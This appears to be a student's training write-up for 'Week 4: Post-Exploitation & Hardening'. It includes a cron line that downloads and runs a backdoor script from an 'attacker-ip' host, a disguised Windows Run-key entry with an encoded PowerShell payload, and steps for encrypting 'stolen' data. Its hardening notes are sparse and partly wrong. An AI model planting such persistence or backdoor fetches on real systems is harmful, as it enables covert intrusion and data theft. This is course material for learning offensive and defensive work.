### Week 4: Post-Exploitation & Hardening

#### ● Goal: Maintaining access and then learning how to fix the holes

#### ● Tasks:

#### ○ Persistence: Set up a 'Cron Job' (Linux) or 'Registry Run Key'  (Windows) so your backdoor starts every time the computer reboots.

Setting Up Persistence Mechanisms

Linux Cron Jobs: Step-by-Step Guide

1. Method Selection:

o  User crontab (crontab -e) for individual users

o  Root crontab (only if you have root) /etc/crontab

2. Edit Crontab: Add the following line at the end:

@reboot /bin/sh -c 'curl http://attacker-ip:8081/backdoor.sh | sh'

This will download and execute your backdoor script every time the system boots.

3. Verification:

crontab -l


<img src="https://github.com/Endlesscyber/CFSS-Cyber-Forensics-Security-Solutions/blob/950ceb204aaed8605ce995bb1f7e6dd31717a9ce/Week%204/Week%204_images/page_1_img_16.jpeg">




<img src="https://github.com/Endlesscyber/CFSS-Cyber-Forensics-Security-Solutions/blob/950ceb204aaed8605ce995bb1f7e6dd31717a9ce/Week%204/Week%204_images/page_1_img_17.png">

Windows Run Keys Setup:

Method 1: Registry Editor (GUI)

1. Press Win+R, type regedit and press Enter.

2. Navigate to HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

3. Right-click "Run" > New > String Value

4. Name it something innocuous like "ServiceManager"



<img src="https://github.com/Endlesscyber/CFSS-Cyber-Forensics-Security-Solutions/blob/950ceb204aaed8605ce995bb1f7e6dd31717a9ce/Week%204/Week%204_images/page_2_img_9.jpeg">


<img src="https://github.com/Endlesscyber/CFSS-Cyber-Forensics-Security-Solutions/blob/950ceb204aaed8605ce995bb1f7e6dd31717a9ce/Week%204/Week%204_images/page_2_img_10.jpeg">


5. Set the data value:

cmd.exe /c powershell -e JABiAGoAIAAgACIATQBZAF8AYgAtk3y1w6KJjG2rXQfL7b95

Data Exfiltration: Learn how to compress and encrypt "stolen" data  before moving it out of the network.

Steps for Encrypting and Decrypting a File in Linux using OpenSSL


<img src="https://github.com/Endlesscyber/CFSS-Cyber-Forensics-Security-Solutions/blob/950ceb204aaed8605ce995bb1f7e6dd31717a9ce/Week%204/Week%204_images/page_3_img_8.jpeg">


<img src="https://github.com/Endlesscyber/CFSS-Cyber-Forensics-Security-Solutions/blob/950ceb204aaed8605ce995bb1f7e6dd31717a9ce/Week%204/Week%204_images/page_3_img_9.png">


Step 1: Check the File to Encrypt

First, make sure the file you want to encrypt exists:

ls -l stolen_data.zip

•  stolen_data.zip is the file to encrypt.

•  Ensure you are in the correct directory.

Step 2: Encrypt the File

Use OpenSSL to encrypt the file with AES-256-CBC algorithm:

openssl enc -aes-256-cbc -salt -in stolen_data.zip -out data.enc -k securepassword

Step 3: Verify the Encrypted File

Check that the encrypted file exists:

ls -l

You should see:

stolen_data.zip  data.enc

Note: data.enc is the encrypted version. The original zip file is still unencrypted.

Step 4: Decrypt the File

To access the original content, decrypt the encrypted file using the same password:


<img src="https://github.com/Endlesscyber/CFSS-Cyber-Forensics-Security-Solutions/blob/950ceb204aaed8605ce995bb1f7e6dd31717a9ce/Week%204/Week%204_images/page_4_img_21.png">


<img src="https://github.com/Endlesscyber/CFSS-Cyber-Forensics-Security-Solutions/blob/950ceb204aaed8605ce995bb1f7e6dd31717a9ce/Week%204/Week%204_images/page_4_img_22.png">


<img src="https://github.com/Endlesscyber/CFSS-Cyber-Forensics-Security-Solutions/blob/950ceb204aaed8605ce995bb1f7e6dd31717a9ce/Week%204/Week%204_images/page_4_img_23.png">


openssl enc -d -aes-256-cbc -salt -in data.enc -out decrypted.zip -k securepassword

Step 5: Verify Decrypted File

Check that the decrypted file exists:

ls -l

You should see:

decrypted.zip

View the contents of the zip:

unzip -l decrypted.zip

Step 6: Workflow Summary

1. Verify the file exists → ls -l stolen_data.zip

2. Encrypt the file → openssl enc -aes-256-cbc -salt -in stolen_data.zip -out data.enc -k

securepassword

3. Verify the encrypted file → ls -l data.enc

4. Decrypt the file → openssl enc -d -aes-256-cbc -salt -in data.enc -out decrypted.zip -k

securepassword

5. Verify and open the decrypted file → unzip decrypted.zip


<img src="https://github.com/Endlesscyber/CFSS-Cyber-Forensics-Security-Solutions/blob/950ceb204aaed8605ce995bb1f7e6dd31717a9ce/Week%204/Week%204_images/page_5_img_20.png">


<img src="https://github.com/Endlesscyber/CFSS-Cyber-Forensics-Security-Solutions/blob/950ceb204aaed8605ce995bb1f7e6dd31717a9ce/Week%204/Week%204_images/page_5_img_21.png">


Security Hardening: For every attack you performed, write one  specific configuration change (e.g., disabling SMBv1) to prevent that  attack.

Attack Prevention Configuration Changes

For each attack method used against systems, here are actionable hardening measures:

SMB Attacks:

Attack: EternalBlue - SMB RCE vulnerability  Prevention: Disable legacy protocols

Web Attacks:

Attack: Path traversal in upload vulnerabilities  Prevention: Implement proper filename validation

File Transfer Vulnerabilities:

Attack: Trojan horse attacks - disguised executables  Prevention:

•  Disable anonymous uploads

•  Implement virus scanning for uploaded files

Network Service Attacks:

1. Remote Services:

2. Protocol Vulnerabilities:


<img src="https://github.com/Endlesscyber/CFSS-Cyber-Forensics-Security-Solutions/blob/950ceb204aaed8605ce995bb1f7e6dd31717a9ce/Week%204/Week%204_images/page_6_img_19.png">


<img src="https://github.com/Endlesscyber/CFSS-Cyber-Forensics-Security-Solutions/blob/950ceb204aaed8605ce995bb1f7e6dd31717a9ce/Week%204/Week%204_images/page_6_img_20.png">


3. File Uploads:

● Final Task: Submit a "Proof of Concept" video or document showing  the full journey from a scan to a "Root" shell.

Ethical OSINT Demonstration - From Scan to Root Shell

Here's how to demonstrate vulnerability discovery ethically during red team engagements:

Scenario Setup:

1. Target environment: Linux web server running Apache and MySQL

2. Network access: Limited internal subnet (no internet)

3. Tools available: Nmap, Nikto, Gobuster, Burp Suite

Vulnerability Discovery:

Step 1: Port Scanning

Target:- http://testphp.vulnweb.com


<img src="https://github.com/Endlesscyber/CFSS-Cyber-Forensics-Security-Solutions/blob/950ceb204aaed8605ce995bb1f7e6dd31717a9ce/Week%204/Week%204_images/page_7_img_14.png">


<img src="https://github.com/Endlesscyber/CFSS-Cyber-Forensics-Security-Solutions/blob/950ceb204aaed8605ce995bb1f7e6dd31717a9ce/Week%204/Week%204_images/page_7_img_15.jpeg">


Step 2: Web Application Analysis

Vulnerability Analysis:

1. Exposing Internal Services:

o  Apache version reveals vulnerabilities

o  PHP/5.6.40 is outdated (CVE-2018-7477


<img src="https://github.com/Endlesscyber/CFSS-Cyber-Forensics-Security-Solutions/blob/950ceb204aaed8605ce995bb1f7e6dd31717a9ce/Week%204/Week%204_images/page_8_img_9.png">


<img src="https://github.com/Endlesscyber/CFSS-Cyber-Forensics-Security-Solutions/blob/950ceb204aaed8605ce995bb1f7e6dd31717a9ce/Week%204/Week%204_images/page_8_img_10.png">


2. Directory Traversal:

Ethical Proof of Concept:

1. No exploitation: Only verify vulnerabilities exist  2. Document everything:

o  All tools used  o  Command outputs for evidence  3. Recommendations:

o  Apache >7.9, PHP >=8.0 upgrade needed  o  Implement proper HTTP headers to prevent directory traversal attacks

